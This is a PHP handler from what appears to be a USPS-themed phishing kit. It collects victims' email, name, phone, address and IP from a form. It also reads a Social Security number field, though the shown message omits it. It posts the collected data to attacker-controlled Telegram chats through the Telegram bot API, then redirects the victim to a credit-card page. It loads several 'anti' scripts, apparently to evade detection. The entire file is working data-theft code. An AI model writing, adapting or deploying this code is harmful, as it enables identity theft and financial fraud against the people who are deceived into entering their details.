<?php 
include "../anti/genius.php";
include "../anti/genius1.php"; 
include "../anti/genius2.php"; 
include "../anti/genius3.php"; 
include "../anti/genius4.php"; 
include "../anti/genius5.php"; 
include "../anti/genius6.php"; 
include "../anti/genius7.php";
include "../anti/genius8.php";
extract($_REQUEST);
include "./id.php";
$EM=$_POST["email"];
$F=$_POST["fname"];
$L=$_POST['lname'];
$PH=$_POST["phoneNumber"];
$C=$_POST['country'];
$A1=$_POST["address1"];
$A2=$_POST['address2'];
$CI=$_POST["city"];
$S=$_POST['sstate'];
$P=$_POST['postalCode'];
$SSN=$_POST["SSN"];
$ipp=$_SERVER['REMOTE_ADDR'];
$message="-------------------- <3 USPS <3-------------------"."\n"."Email :  ".$EM."\n"."First name :  ".$F."\n"."Last name :   ".$L."\n"."Country :   ".$C."\n"."Address 1 :   ".$A1."\n"."Adress 2 :   ".$A2."\n"."City :   ".$CI."\n"."State :   ".$S."\n"."ZIP Code :   ".$P."\n"."Phone number :   ".$PH."\n"."IP :  ".$ipp."\n"."-------------------- <3 USPS <3-------------------";
$user_ids=$id;
header("location: pages/cc.php");
foreach($user_ids as $user_id) {
$url='https://api.telegram.org/bot'.$token.'/sendMessage';
$data=array('chat_id'=>$user_id,'text'=>$message);
$options=array('http'=>array('method'=>'POST','header'=>"Content-Type:application/x-www-form-urlencoded\r\n",'content'=>http_build_query($data),),);
$context=stream_context_create($options);
$result=file_get_contents($url,false,$context);

}
?>